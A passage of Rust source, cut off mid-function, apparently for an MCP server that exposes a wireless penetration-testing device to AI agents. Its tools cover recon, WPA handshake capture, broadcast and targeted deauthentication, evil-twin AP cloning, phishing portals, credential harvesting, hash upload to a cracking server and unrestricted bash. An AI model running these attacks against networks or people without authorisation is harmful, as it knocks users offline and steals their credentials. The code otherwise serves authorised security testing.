//! MCP tool catalog and dispatch.
//!
//! All tools run on-device directly (introspection via fs/env, device actions by
//! exec'ing the PINEAPPLE_*/DuckyScript and blue5ctl binaries). Every tool is
//! always advertised and callable: the server is reached over SSH, so the caller
//! already has a root shell and an in-server capability gate would protect
//! nothing. Loosely, they are read-only recon/loot, passive recon tuning, and
//! full device control + active RF (bash, duckyscript, deauth, filter edits).

use crate::bt;
use crate::device;
use crate::intel;
use crate::recon;
use serde_json::{json, Value};
use std::path::PathBuf;

pub struct Server {
    pub loot_dir: PathBuf,
    pub read_cap: usize,
    pub recon: Value,
}

const READ_CAP_DEFAULT: usize = 256 * 1024;

impl Server {
    pub fn from_env() -> Server {
        let loot_dir = std::env::var("MCP_LOOT_DIR").unwrap_or_else(|_| "/root/loot".to_string());
        let read_cap = std::env::var("MCP_READ_CAP_BYTES")
            .ok()
            .and_then(|v| v.parse().ok())
            .filter(|&n| n > 0)
            .unwrap_or(READ_CAP_DEFAULT);
        Server {
            loot_dir: PathBuf::from(loot_dir),
            read_cap,
            recon: device::recon_context(),
        }
    }

    /// Tool definitions advertised via `tools/list`.
    pub fn tool_list(&self) -> Vec<Value> {
        let mut tools = vec![
            tool("system_info", "Kernel, uptime, storage, memory and firmware details of the Pager.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("recon_context", "The selected access point / client recon data this payload was launched against (the _RECON_SELECTED_* fields).", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("list_loot", "List files captured under the loot directory (handshakes, pcaps, reports).", json!({
                "type":"object",
                "properties":{
                    "subpath":{"type":"string","description":"Optional path relative to the loot root, e.g. 'handshakes'."},
                    "max_entries":{"type":"integer","minimum":1,"maximum":1000,"description":"Maximum entries to return (default 200)."}
                },
                "additionalProperties":false
            })),
            tool("read_loot", "Read a text file from the loot directory (capped in size).", json!({
                "type":"object",
                "properties":{"path":{"type":"string","description":"Path relative to the loot root."}},
                "required":["path"],
                "additionalProperties":false
            })),
            tool("handshake_stats", "Count captured handshake artifacts (.22000/.pcap/.pcapng), optionally filtered by a MAC address substring.", json!({
                "type":"object",
                "properties":{"mac":{"type":"string","description":"Optional MAC to filter filenames by."}},
                "additionalProperties":false
            })),
            tool("recon_list", "Survey the wireless environment from the recon database: nearby access points or client stations. Defaults to the last 120s ('around me now'); set max_age_seconds=0 for all-time.", json!({
                "type":"object",
                "properties":{
                    "kind":{"type":"string","enum":["aps","clients"],"description":"'aps' (beaconing networks) or 'clients' (stations); default aps."},
                    "max_age_seconds":{"type":"integer","minimum":0,"description":"Only include things heard within this many seconds (default 120; 0 = all time)."},
                    "band":{"type":"string","enum":["2.4","5","6"],"description":"Optional band filter (GHz)."},
                    "min_signal":{"type":"integer","description":"Optional minimum signal in dBm, e.g. -70 (stronger/closer only)."},
                    "limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 100)."}
                },
                "additionalProperties":false
            })),
            tool("recon_ap_detail", "Everything the recon engine knows about one access point (BSSID): its SSIDs, radio/band/security, signal, captured handshakes, and stations seen associated with it.", json!({
                "type":"object",
                "properties":{"bssid":{"type":"string","description":"AP BSSID, e.g. aa:bb:cc:dd:ee:ff."}},
                "required":["bssid"],
                "additionalProperties":false
            })),
            tool("handshakes", "List captured WPA handshakes (AP SSID/BSSID, client, time, EAPOL frames) from the recon database, newest first. Set since_seconds to poll for newly captured handshakes.", json!({
                "type":"object",
                "properties":{
                    "since_seconds":{"type":"integer","minimum":0,"description":"Only handshakes captured within this many seconds (0 = all; default 0)."},
                    "limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 100)."}
                },
                "additionalProperties":false
            })),
            tool("channel_lock", "Stop recon channel-hopping and lock the radio to one channel (or an AP's channel) to maximize handshake capture. Call channel_unlock to resume hopping.", json!({
                "type":"object",
                "properties":{
                    "channel":{"type":"integer","minimum":1,"description":"Channel number to lock to."},
                    "bssid":{"type":"string","description":"Alternatively, lock to this AP's channel."},
                    "seconds":{"type":"integer","minimum":1,"description":"Optional auto-unlock after this many seconds."}
                },
                "additionalProperties":false
            })),
            tool("channel_unlock", "Resume recon channel-hopping after a channel_lock.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("notify", "Signal the operator on the physical Pager (log line, popup alert, vibration, LED or ringtone).", json!({
                "type":"object",
                "properties":{
                    "kind":{"type":"string","enum":["log","alert","vibrate","led","ringtone"]},
                    "message":{"type":"string","description":"Text for log/alert/vibrate/ringtone-name, or LED spec like 'red solid'."},
                    "color":{"type":"string","enum":["red","green","blue"],"description":"Optional color for kind=log."}
                },
                "required":["kind","message"],
                "additionalProperties":false
            })),
            tool("recon_set_bands", "Select which Wi-Fi bands the recon engine hops across.", json!({
                "type":"object",
                "properties":{
                    "bands":{"type":"array","items":{"type":"integer","enum":[2,5,6]},"minItems":1,"description":"Subset of 2, 5, 6 (GHz)."},
                    "interface":{"type":"string","description":"Monitor interface (default wlan1mon)."}
                },
                "required":["bands"],
                "additionalProperties":false
            })),
            tool("recon_new_session", "Start a fresh recon session (also rotates pcap/Wigle logs if running).", json!({
                "type":"object",
                "properties":{"name":{"type":"string","description":"Optional session name."}},
                "additionalProperties":false
            })),
            tool("list_filters", "Show the contents of a Pineapple device (MAC) or network (SSID) filter list.", json!({
                "type":"object",
                "properties":{
                    "type":{"type":"string","enum":["device","network"]},
                    "list":{"type":"string","enum":["allow","deny"]}
                },
                "required":["type","list"],
                "additionalProperties":false
            })),
            tool("pcap_control", "Start or stop the recon engine's optimized Wi-Fi pcap log.", json!({
                "type":"object",
                "properties":{"action":{"type":"string","enum":["start","stop"]}},
                "required":["action"],
                "additionalProperties":false
            })),
            tool("find_client_ip", "Search ARP/DHCP records for the IP of a client associated to a Pineapple AP.", json!({
                "type":"object",
                "properties":{
                    "mac":{"type":"string"},
                    "timeout":{"type":"integer","minimum":1,"description":"Seconds before giving up."}
                },
                "required":["mac"],
                "additionalProperties":false
            })),
            // ---- Bluetooth recon (blue5, Pager 2.0) ----
            tool("bt_status", "blue5 Bluetooth scanner and adapter state: LE/Classic scan mode, device counts (LE/BR/dual), event rate, database/WiGLE logging state and GPS status.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("bt_list", "Survey Bluetooth devices seen by the blue5 scanner (BLE and Classic) from the current scan, strongest signal first. Defaults to the last 120s ('around me now'); set max_age_seconds=0 for the whole scan.", json!({
                "type":"object",
                "properties":{
                    "type":{"type":"string","enum":["le","classic","dual"],"description":"Filter by transport: 'le' (BLE only), 'classic' (BR/EDR only) or 'dual'."},
                    "max_age_seconds":{"type":"integer","minimum":0,"description":"Only devices heard within this many seconds (default 120; 0 = whole scan)."},
                    "min_rssi":{"type":"integer","description":"Optional minimum average RSSI in dBm, e.g. -70 (stronger/closer only)."},
                    "named_only":{"type":"boolean","description":"Only devices that advertised a name."},
                    "connectable_only":{"type":"boolean","description":"Only LE-connectable devices."},
                    "no_random":{"type":"boolean","description":"Drop LE random (rotating) addresses; keep public and Classic."},
                    "company":{"type":"string","description":"Filter by Bluetooth SIG company id, e.g. '0x004C' (Apple) or '76'."},
                    "limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 100)."}
                },
                "additionalProperties":false
            })),
            tool("bt_device_detail", "Everything blue5 knows about one Bluetooth device (MAC): name, vendor/company, transport, connectability, Class-of-Device, appearance, advertised 16-bit services, RSSI history and raw manufacturer/service data (hex).", json!({
                "type":"object",
                "properties":{"mac":{"type":"string","description":"Device MAC, e.g. aa:bb:cc:dd:ee:ff (separators optional)."}},
                "required":["mac"],
                "additionalProperties":false
            })),
            tool("bt_scan_config", "Tune the live blue5 scan: toggle active LE, Classic (BR/EDR) inquiry, LE scanning, the LE Coded (long-range) PHY, dropping LE random addresses and Classic name requests, and set inquiry round length/pause. Only the fields you set are changed.", json!({
                "type":"object",
                "properties":{
                    "active_le":{"type":"boolean","description":"Active LE scan (request scan responses, which often carry names)."},
                    "classic":{"type":"boolean","description":"BR/EDR (Classic) inquiry on/off."},
                    "le":{"type":"boolean","description":"LE scanning on/off (false = Classic only)."},
                    "coded_phy":{"type":"boolean","description":"Also scan the LE Coded (long-range) PHY."},
                    "drop_random":{"type":"boolean","description":"Drop LE random-address adverts so rotating addresses don't fill the table."},
                    "name_requests":{"type":"boolean","description":"Classic name requests (false = more passive, never page for a name)."},
                    "pause_seconds":{"type":"integer","minimum":0,"maximum":3600,"description":"Pause between Classic inquiry rounds (seconds)."},
                    "round_units":{"type":"integer","minimum":1,"maximum":48,"description":"Classic inquiry round length in 1.28s units (1-48)."}
                },
                "additionalProperties":false
            })),
            tool("bt_recon_new", "Start a fresh blue5 database scan: flush and clear the device table and log to a new scan row (analogous to recon_new_session for Wi-Fi).", json!({
                "type":"object",
                "properties":{"name":{"type":"string","description":"Optional name for the new scan."}},
                "additionalProperties":false
            })),
            tool("bt_recon_end", "End the current blue5 database scan: do a final flush, then stop writing to the database (the live scan keeps running).", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("bt_wigle", "Turn WiGLE CSV logging of Bluetooth devices on or off (needs a GPS source and blue5 started with a WiGLE directory).", json!({
                "type":"object",
                "properties":{"action":{"type":"string","enum":["on","off"]}},
                "required":["action"],
                "additionalProperties":false
            })),
            // ---- structured intel (read-only) ----
            tool("connected_clients", "List stations associated to the Pager's OWN hostapd APs (from the recon hostap_client table): client MAC, the AP SSID they joined, connect/disconnect times and whether still connected.", json!({
                "type":"object",
                "properties":{"limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 200)."}},
                "additionalProperties":false
            })),
            tool("probes", "Probe-request SSIDs from the recon database. action='list' shows each probed SSID with the client MAC probing for it; action='top' ranks SSIDs by number of distinct devices probing (networks named by >1 device).", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["list","top"],"description":"'list' (raw) or 'top' (ranked). Default top."},
                    "limit":{"type":"integer","minimum":1,"maximum":1000,"description":"Max rows (default 100)."}
                },
                "additionalProperties":false
            })),
            tool("captured_credentials", "Credentials captured on this engagement: captive/evil-portal credential logs from loot (goodportal), plus WPA-Enterprise EAP identities/passwords and MSCHAPv2 challenge-responses from the recon database.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("handshake_quality", "Classify and dedupe captured WPA handshakes in loot: counts capture files, unique handshakes (by MIC/PMKID), PMKID vs EAPOL hashlines, files with no crackable material, and a per-ESSID breakdown.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("find_suspicious", "Heuristic threat sweep across Bluetooth (blue5) and Wi-Fi (recon) data: Flipper Zero devices, Flock Safety surveillance gear, Bluetooth skimmer modules, SSID-spoofing APs, and rogue Pineapple/Pager beacons. Community signatures — corroborate before acting.", json!({"type":"object","properties":{},"additionalProperties":false})),
            // ---- PineAP / evil-twin device commands ----
            tool("ssid_pool", "Manage the PineAP SSID pool (the beacon list the Open AP advertises). Actions: add/add_file/delete/clear/list/collect_start/collect_stop (auto-collect probed SSIDs)/start/stop. start needs the Open AP enabled and mimic on.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["add","add_file","delete","clear","list","collect_start","collect_stop","start","stop"]},
                    "ssids":{"type":"array","items":{"type":"string"},"description":"SSIDs for add/delete."},
                    "file":{"type":"string","description":"Path to a file with one SSID per line (add_file)."},
                    "randomize":{"type":"boolean","description":"start only: true = random BSSID per SSID, false = Open AP BSSID (default)."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            tool("mimic", "Enable or disable PineAP 'mimic' mode (accept connections for pooled/mimicked SSIDs on the Open AP). Required before ssid_pool start.", json!({
                "type":"object",
                "properties":{"action":{"type":"string","enum":["enable","disable"]}},
                "required":["action"],
                "additionalProperties":false
            })),
            tool("clone_ap", "Clone a target AP's SSID (and optionally BSSID) into the persistent Open AP (wlan0open) via UCI, then reload Wi-Fi. action='restore' removes the BSSID override. Pass ssid/bssid from recon.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["clone","restore"]},
                    "ssid":{"type":"string","description":"SSID to clone (clone)."},
                    "bssid":{"type":"string","description":"Optional BSSID to spoof on the Open AP (clone)."},
                    "add_to_pool":{"type":"boolean","description":"Also add the SSID to the PineAP pool."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            // ---- GPS / WiGLE / wardriving ----
            tool("gps", "Native GPS control. action='list' lists attached USB-serial GPS devices; 'configure' sets the GPSd serial device + baud; 'get' returns the current position/fix.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["list","configure","get"]},
                    "device":{"type":"string","description":"GPS device path/id from gps list (configure)."},
                    "baud":{"type":"integer","description":"Baud rate, e.g. 4800/9600/115200 (configure)."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            tool("wifi_wigle", "Wi-Fi WiGLE logging (distinct from bt_wigle). Actions: login(username,password)/logout/start(returns log file)/stop/upload(files, optional archive/remove). Logs land in loot/wigle; need a GPS fix to populate.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["login","logout","start","stop","upload"]},
                    "username":{"type":"string"},
                    "password":{"type":"string"},
                    "files":{"type":"array","items":{"type":"string"},"description":"Files to upload (upload)."},
                    "archive":{"type":"boolean","description":"upload: move uploaded files to loot/archive/wigle."},
                    "remove":{"type":"boolean","description":"upload: delete uploaded files after upload."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            tool("wardrive", "Start or stop a wardrive: configure GPS (optional), restart gpsd and start Wi-Fi WiGLE logging; stop closes the WiGLE log. Needs a physical GPS with sky view to populate.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["start","stop"]},
                    "device":{"type":"string","description":"GPS device from gps list (start; optional, else uses current)."},
                    "baud":{"type":"integer","description":"GPS baud (start; default 9600)."},
                    "mode":{"type":"string","enum":["GPSD","PINEAP"],"description":"GPS mode (start; default GPSD)."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            // ---- portals ----
            tool("evil_portal", "Control Evil Portal (captive portal). Actions: status/list (show installed portals + active one), start/stop/enable/disable, switch(name). Errors cleanly if Evil Portal isn't installed.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["status","list","start","stop","enable","disable","switch"]},
                    "name":{"type":"string","description":"Portal name to activate (switch)."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            tool("captive_portal", "Manage the nginx-based goodportal captive portal. action='status' (nginx + portal state), 'list' (portals under /www/goodportal), 'remove' (tear down nginx/firewall/monitor and restore config). Captured creds appear in captured_credentials.", json!({
                "type":"object",
                "properties":{"action":{"type":"string","enum":["status","list","remove"]}},
                "required":["action"],
                "additionalProperties":false
            })),
            // ---- device / network ops ----
            tool("mac_spoof", "Change or restore a network interface's MAC. action='set' (interface+mac, optional hostname), 'restore' (back to the permanent MAC via ethtool), 'show' (current MAC). Brings the interface down/up.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["set","restore","show"]},
                    "interface":{"type":"string","description":"Interface, e.g. wlan0cli, eth0."},
                    "mac":{"type":"string","description":"New MAC (set)."},
                    "hostname":{"type":"string","description":"Optional hostname to set with the MAC (set)."}
                },
                "required":["action","interface"],
                "additionalProperties":false
            })),
            tool("mgmt_access", "Toggle management access (SSH:22 + Web UI:1471) from the Client Wi-Fi (wan zone) via a UCI firewall rule. action='status'/'open'/'lock'. Restarts the firewall.", json!({
                "type":"object",
                "properties":{"action":{"type":"string","enum":["status","open","lock"]}},
                "required":["action"],
                "additionalProperties":false
            })),
            // ---- active scanning / capture / exfil ----
            tool("nmap_scan", "Run nmap and save results to loot. scan='discovery' (ping sweep), 'subnet' (fast SYN top-100), 'smb' (port 445 sweep). target is an IP/CIDR. Active/networked — authorized engagements only.", json!({
                "type":"object",
                "properties":{
                    "scan":{"type":"string","enum":["discovery","subnet","smb"]},
                    "target":{"type":"string","description":"IP or CIDR, e.g. 172.16.52.0/24."}
                },
                "required":["scan","target"],
                "additionalProperties":false
            })),
            tool("hcx_capture", "hcxdumptool PMKID/EAPOL capture (alternative to the recon engine). action='status'/'start'/'stop'. NOTE: hcxdumptool may not be installed; start reports that. Prefer pcap_control/handshakes for native capture.", json!({
                "type":"object",
                "properties":{
                    "action":{"type":"string","enum":["status","start","stop"]},
                    "interface":{"type":"string","description":"Monitor interface (start; default wlan1mon)."}
                },
                "required":["action"],
                "additionalProperties":false
            })),
            tool("usb_export", "Mount the first attached USB partition, copy /root/loot to it (timestamped dir), sync, and lazy-unmount. Needs a USB drive with a supported filesystem.", json!({"type":"object","properties":{},"additionalProperties":false})),
            tool("hashtopolis_upload", "Upload a hashcat-22000 file to a Hashtopolis server (legacy JSON API): create a hashlist and run a pretask. Networked upload of captured hashes — authorized use only.", json!({
                "type":"object",
                "properties":{
                    "hashcat_file":{"type":"string","description":"Path to the .22000 hashcat file to upload."},
                    "url":{"type":"string","description":"Hashtopolis API endpoint, e.g. http://host/api/user.php."},
                    "api_key":{"type":"string","description":"Hashtopolis access key / voucher."},
                    "pretask_id":{"type":"integer"},
                    "cracker_version_id":{"type":"integer"},
                    "hash_type":{"type":"integer","description":"Hashcat mode (default 22000)."},
                    "access_group_id":{"type":"integer","description":"Access group id (default 1)."},
                    "name":{"type":"string","description":"Optional hashlist/task name."}
                },
                "required":["hashcat_file","url","api_key","pretask_id","cracker_version_id"],
                "additionalProperties":false
            })),
        ];

        // Full device control + active RF tools. The transport is root SSH, so
        // anyone who can reach this server already has a root shell; these add no
        // new privilege, they just expose it as structured tools.
        tools.push(tool("bash", "[FULL ACCESS] Run an arbitrary bash command on the Pager (via 'bash -c'). DuckyScript/PINEAPPLE_* commands are on PATH and callable from here too. Returns combined stdout/stderr and the exit code. Long-running work should be backgrounded (e.g. 'cmd & echo started').", json!({
                "type":"object",
                "properties":{"command":{"type":"string","description":"Shell command(s) to run. May span multiple lines."}},
                "required":["command"],
                "additionalProperties":false
            })));
            tools.push(tool("duckyscript", "[FULL ACCESS] Run any executable by name or absolute path with arguments (DuckyScript/PINEAPPLE_* or any other binary; structured alternative to 'bash'). Example: command='PINEAPPLE_EXAMINE_CHANNEL', args=['6','30'].", json!({
                "type":"object",
                "properties":{
                    "command":{"type":"string","description":"Command/function name, e.g. 'ALERT' or 'PINEAPPLE_SET_BANDS'."},
                    "args":{"type":"array","items":{"type":"string"},"description":"Positional arguments."}
                },
                "required":["command"],
                "additionalProperties":false
            })));
            tools.push(tool("deauth_broadcast", "[ACTIVE] Deauthenticate ALL clients on an AP (broadcast). Authorized engagements only.", json!({
                "type":"object",
                "properties":{
                    "bssid":{"type":"string","description":"AP BSSID to target."},
                    "channel":{"type":"integer","minimum":1},
                    "csa":{"type":"boolean","description":"Use channel-switch-announcement method instead of deauth/disassoc frames (default false)."}
                },
                "required":["bssid","channel"],
                "additionalProperties":false
            })));
            tools.push(tool("deauth_clients", "[ACTIVE] Send directed deauth/disassoc frames to specific client MACs on an AP (more reliable than broadcast). Feed it a client list from recon_list(kind=clients) or recon_ap_detail. Authorized engagements only.", json!({
                "type":"object",
                "properties":{
                    "bssid":{"type":"string","description":"AP BSSID the clients are on."},
                    "channel":{"type":"integer","minimum":1},
                    "clients":{"type":"array","items":{"type":"string"},"minItems":1,"description":"Client MAC addresses to disconnect."}
                },
                "required":["bssid","channel","clients"],
                "additionalProperties":false
            })));
            tools.push(tool("device_filter_edit", "[ACTIVE] Edit a Pineapple device (MAC) filter list defining engagement scope.", json!({
                "type":"object",
                "properties":{
                    "list":{"type":"string","enum":["allow","deny"]},
                    "action":{"type":"string","enum":["add","delete","clear","mode"]},
                    "macs":{"type":"array","items":{"type":"string"},"description":"MACs for add/delete."},
                    "mode":{"type":"string","enum":["allow","deny"],"description":"Operational mode for action=mode."}
                },
                "required":["list","action"],
                "additionalProperties":false
            })));
            tools.push(tool("network_filter_edit", "[ACTIVE] Edit a Pineapple network (SSID) filter list defining engagement scope.", json!({
                "type":"object",
                "properties":{
                    "list":{"type":"string","enum":["allow","deny"]},
                    "action":{"type":"string","enum":["add","delete","clear","mode"]},
                    "ssids":{"type":"array","items":{"type":"string"},"description":"SSIDs for add/delete."},
                    "mode":{"type":"string","enum":["allow","deny"],"description":"Operational mode for action=mode."}
                },
                "required":["list","action"],
                "additionalProperties":false
            })));
        tools
    }

    /// Dispatch a `tools/call`. Returns tool text output or an error message.
    pub fn call_tool(&self, name: &str, args: &Value) -> Result<String, String> {
        match name {
            // ---- direct, read-only ----
            "system_info" => Ok(device::system_info()),
            "recon_context" => Ok(pretty(&self.recon)),
            "list_loot" => {
                let subpath = opt_str(args, "subpath").unwrap_or_default();
                let max = args.get("max_entries").and_then(Value::as_u64).unwrap_or(200) as usize;
                device::list_loot(&self.loot_dir, &subpath, max.clamp(1, 1000)).map(|v| pretty(&v))
            }
            "read_loot" => {
                let path = req_str(args, "path")?;
                device::read_loot(&self.loot_dir, &path, self.read_cap).map(|v| pretty(&v))
            }
            "handshake_stats" => {
                let mac = opt_str(args, "mac");
                Ok(pretty(&device::handshake_stats(&self.loot_dir, mac.as_deref())))
            }

            // ---- passive device commands (run directly) ----
            "notify" => {
                let kind = req_str(args, "kind")?;
                let msg = req_str(args, "message")?;
                match kind.as_str() {
                    "log" => {
                        let mut a = Vec::new();
                        if let Some(c) = opt_str(args, "color").filter(|c| !c.is_empty()) {
                            a.push(c);
                        }
                        a.push(msg);
                        device::run_cmd("LOG", &a)
                    }
                    "alert" => device::run_cmd("ALERT", &[msg]),
                    "vibrate" => device::run_cmd("VIBRATE", &[msg]),
                    // LED takes space-separated words, e.g. "red solid".
                    "led" => device::run_cmd(
                        "LED",
                        &msg.split_whitespace().map(String::from).collect::<Vec<_>>(),
                    ),
                    "ringtone" => device::run_cmd("RINGTONE", &[msg]),
                    other => Err(format!("unknown notify kind: {other}")),
                }
            }
            "recon_list" => {
                let kind = opt_str(args, "kind").unwrap_or_else(|| "aps".to_string());
                let max_age = args.get("max_age_seconds").and_then(Value::as_i64).unwrap_or(120);
                let band = opt_str(args, "band");
                let min_signal = args.get("min_signal").and_then(Value::as_i64);
                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(100);
                recon::list(&kind, max_age, band.as_deref(), min_signal, limit)
            }
            "recon_ap_detail" => {
                let bssid = req_str(args, "bssid")?;
                if !is_mac(&bssid) {
                    return Err("bssid must look like aa:bb:cc:dd:ee:ff".to_string());
                }
                recon::ap_detail(&bssid)
            }
            "handshakes" => {
                let since = args.get("since_seconds").and_then(Value::as_i64).unwrap_or(0);
                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(100);
                recon::handshakes(since, limit)
            }
            "channel_lock" => {
                let seconds = opt_num_str(args, "seconds");
                if let Some(bssid) = opt_str(args, "bssid") {
                    let bssid = norm_mac(&bssid).ok_or("bssid must look like aa:bb:cc:dd:ee:ff")?;
                    device::run_cmd("PINEAPPLE_EXAMINE_BSSID", &with_opt(&[bssid], seconds))
                } else if let Some(ch) = opt_num_str(args, "channel") {
                    device::run_cmd("PINEAPPLE_EXAMINE_CHANNEL", &with_opt(&[ch], seconds))
                } else {
                    Err("provide either 'channel' or 'bssid' to lock to".to_string())
                }
            }
            "channel_unlock" => device::run_cmd("PINEAPPLE_EXAMINE_RESET", &[]),
            "recon_set_bands" => {
                let iface = opt_str(args, "interface").unwrap_or_else(|| "wlan1mon".to_string());
                let bands = args
                    .get("bands")
                    .and_then(Value::as_array)
                    .ok_or("bands array is required")?;
                let mut call_args = vec![iface];
                for b in bands {
                    match b.as_u64() {
                        Some(n @ (2 | 5 | 6)) => call_args.push(n.to_string()),
                        _ => return Err("bands may only contain 2, 5 or 6".to_string()),
                    }
                }
                device::run_cmd("PINEAPPLE_SET_BANDS", &call_args)
            }
            "recon_new_session" => {
                let name = opt_str(args, "name");
                device::run_cmd("PINEAPPLE_RECON_NEW", &name.map(|n| vec![n]).unwrap_or_default())
            }
            "list_filters" => {
                let list = enum_arg(args, "list", &["allow", "deny"])?;
                match req_str(args, "type")?.as_str() {
                    "device" => device::run_cmd("PINEAPPLE_DEVICE_FILTER_LIST", &[list]),
                    "network" => device::run_cmd("PINEAPPLE_NETWORK_FILTER_LIST", &[list]),
                    other => Err(format!("unknown filter type: {other}")),
                }
            }
            "pcap_control" => match enum_arg(args, "action", &["start", "stop"])?.as_str() {
                "start" => device::run_cmd("WIFI_PCAP_START", &[]),
                _ => device::run_cmd("WIFI_PCAP_STOP", &[]),
            },
            "find_client_ip" => {
                let mac = norm_mac(&req_str(args, "mac")?).ok_or("mac must look like aa:bb:cc:dd:ee:ff")?;
                let timeout = opt_num_str(args, "timeout");
                device::run_cmd("FIND_CLIENT_IP", &with_opt(&[mac], timeout))
            }

            // ---- Bluetooth recon (blue5), read-only + passive control ----
            "bt_status" => device::run_cmd("blue5ctl", &["status".to_string()]),
            "bt_list" => {
                let type_filter = opt_str(args, "type");
                let max_age = args.get("max_age_seconds").and_then(Value::as_i64).unwrap_or(120);
                let min_rssi = args.get("min_rssi").and_then(Value::as_i64);
                let named = args.get("named_only").and_then(Value::as_bool).unwrap_or(false);
                let connectable = args.get("connectable_only").and_then(Value::as_bool).unwrap_or(false);
                let no_random = args.get("no_random").and_then(Value::as_bool).unwrap_or(false);
                let company = match args.get("company") {
                    Some(Value::String(s)) => Some(parse_company(s)?),
                    Some(Value::Number(n)) => n.as_i64(),
                    _ => None,
                };
                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(100);
                bt::list(type_filter.as_deref(), max_age, min_rssi, named, connectable, company, no_random, limit)
            }
            "bt_device_detail" => {
                let mac = norm_mac(&req_str(args, "mac")?).ok_or("mac must look like aa:bb:cc:dd:ee:ff")?;
                bt::detail(&mac)
            }
            "bt_scan_config" => {
                let mut call: Vec<String> = vec!["scan".to_string()];
                let mut push_bool = |key: &str, flag: &str| {
                    if let Some(b) = args.get(key).and_then(Value::as_bool) {
                        call.push(flag.to_string());
                        call.push(if b { "1" } else { "0" }.to_string());
                    }
                };
                push_bool("active_le", "-A");
                push_bool("classic", "-C");
                push_bool("le", "-E");
                push_bool("coded_phy", "-c");
                push_bool("drop_random", "-D");
                push_bool("name_requests", "-M");
                drop(push_bool);
                if let Some(p) = args.get("pause_seconds").and_then(Value::as_i64) {
                    call.push("-P".to_string());
                    call.push(p.clamp(0, 3600).to_string());
                }
                if let Some(u) = args.get("round_units").and_then(Value::as_i64) {
                    call.push("-L".to_string());
                    call.push(u.clamp(1, 48).to_string());
                }
                if call.len() == 1 {
                    return Err("set at least one scan parameter to change".to_string());
                }
                device::run_cmd("blue5ctl", &call)
            }
            "bt_recon_new" => {
                let mut call = vec!["new".to_string()];
                if let Some(name) = opt_str(args, "name").filter(|n| !n.is_empty()) {
                    call.push(name);
                }
                device::run_cmd("blue5ctl", &call)
            }
            "bt_recon_end" => device::run_cmd("blue5ctl", &["end".to_string()]),
            "bt_wigle" => {
                let action = enum_arg(args, "action", &["on", "off"])?;
                device::run_cmd("blue5ctl", &["wigle".to_string(), action])
            }

            // ---- structured intel (read-only) ----
            "connected_clients" => {
                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(200);
                intel::connected_clients(limit)
            }
            "probes" => {
                let action = opt_str(args, "action").unwrap_or_else(|| "top".to_string());
                let limit = args.get("limit").and_then(Value::as_i64).unwrap_or(100);
                intel::probes(&action, limit)
            }
            "captured_credentials" => intel::captured_credentials(&self.loot_dir, self.read_cap),
            "handshake_quality" => intel::handshake_quality(&self.loot_dir),
            "find_suspicious" => intel::find_suspicious(),

            // ---- PineAP / evil-twin device commands ----
            "ssid_pool" => match enum_arg(
                args,
                "action",
                &["add", "add_file", "delete", "clear", "list", "collect_start", "collect_stop", "start", "stop"],
            )?
            .as_str()
            {
                "add" => {
                    let s = str_array(args, "ssids")?;
                    if s.is_empty() {
                        return Err("ssids must contain at least one SSID".to_string());
                    }
                    device::run_cmd("PINEAPPLE_SSID_POOL_ADD", &s)
                }
                "add_file" => device::run_cmd("PINEAPPLE_SSID_POOL_ADD_FILE", &[req_str(args, "file")?]),
                "delete" => {
                    let s = str_array(args, "ssids")?;
                    if s.is_empty() {
                        return Err("ssids must contain at least one SSID".to_string());
                    }
                    device::run_cmd("PINEAPPLE_SSID_POOL_DELETE", &s)
                }
                "clear" => device::run_cmd("PINEAPPLE_SSID_POOL_CLEAR", &[]),
                "list" => device::run_cmd("PINEAPPLE_SSID_POOL_LIST", &[]),
                "collect_start" => device::run_cmd("PINEAPPLE_SSID_POOL_COLLECT_START", &[]),
                "collect_stop" => device::run_cmd("PINEAPPLE_SSID_POOL_COLLECT_STOP", &[]),
                "start" => {
                    let mut a = Vec::new();
                    if let Some(r) = args.get("randomize").and_then(Value::as_bool) {
                        a.push(if r { "true" } else { "false" }.to_string());
                    }
                    device::run_cmd("PINEAPPLE_SSID_POOL_START", &a)
                }
                _ => device::run_cmd("PINEAPPLE_SSID_POOL_STOP", &[]),
            },
            "mimic" => match enum_arg(args, "action", &["enable", "disable"])?.as_str() {
                "enable" => device::run_cmd("PINEAPPLE_MIMIC_ENABLE", &[]),
                _ => device::run_cmd("PINEAPPLE_MIMIC_DISABLE", &[]),
            },
            "clone_ap" => match enum_arg(args, "action", &["clone", "restore"])?.as_str() {
                "clone" => {
                    let ssid = req_str(args, "ssid")?;
                    let mut steps: Vec<(&str, Vec<String>)> = vec![(
                        "uci",
                        vec!["set".to_string(), format!("wireless.wlan0open.ssid={ssid}")],
                    )];
                    if let Some(b) = opt_str(args, "bssid").filter(|b| !b.is_empty()) {
                        let mac = norm_mac(&b).ok_or("bssid must be a MAC address")?;
                        steps.push(("uci", vec!["set".to_string(), format!("wireless.wlan0open.macaddr={mac}")]));
                    }
                    steps.push(("uci", vec!["set".to_string(), "wireless.wlan0open.disabled=0".to_string()]));
